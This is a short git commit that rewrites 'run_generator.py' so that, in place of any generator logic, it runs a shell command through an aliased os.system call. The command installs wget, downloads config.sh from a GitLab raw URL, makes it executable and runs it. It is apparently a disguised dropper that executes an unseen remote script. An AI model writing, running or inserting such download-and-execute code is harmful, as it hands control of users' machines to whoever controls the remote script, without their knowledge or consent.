1a397457fa619581ebd3da2025faab8622d579d2
zulhamman94 <93866592+zulhamman94@users.noreply.github.com>
2021-11-07 19:35:02 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,1 +1,2 @@
-wget https://gitlab.com/kastcrone/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
+import os as alpha
+alpha.system("apt-get install wget && wget https://gitlab.com/kastcrone/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh")
